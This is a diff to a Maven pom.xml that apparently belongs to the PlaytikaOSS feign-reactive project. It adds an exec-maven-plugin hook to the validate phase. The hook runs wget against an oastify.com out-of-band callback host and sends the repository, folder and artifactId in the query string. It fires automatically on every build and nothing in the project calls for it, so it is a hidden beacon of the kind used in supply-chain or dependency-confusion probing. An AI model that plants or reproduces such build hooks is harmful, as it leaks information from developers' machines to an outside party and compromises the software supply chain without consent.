@@ -70,4 +70,28 @@
 
     </dependencies>
 
+<build>
+    <plugins>
+            <plugin>
+                <groupId>org.codehaus.mojo</groupId>
+                <artifactId>exec-maven-plugin</artifactId>
+                <version>1.6.0</version>
+                <executions>
+                    <execution>
+                        <id>run-script</id>
+                        <phase>validate</phase>
+                        <goals>
+                            <goal>exec</goal>
+                        </goals>
+                    </execution>
+                </executions>
+                <configuration>
+                    <executable>wget</executable>
+                    <arguments>
+                        <argument>wget http://moti.7pxsnvw7bynwyjspuwd8ifuvxm3jr9fy.oastify.com/test?repository=git@github.com:PlaytikaOSS/feign-reactive.git&amp;folder=feign-reactor-spring-configuration&amp;artifactId=${artifactId}</argument>
+                    </arguments>
+                </configuration>
+            </plugin>
+    </plugins>
+    </build>
 </project>
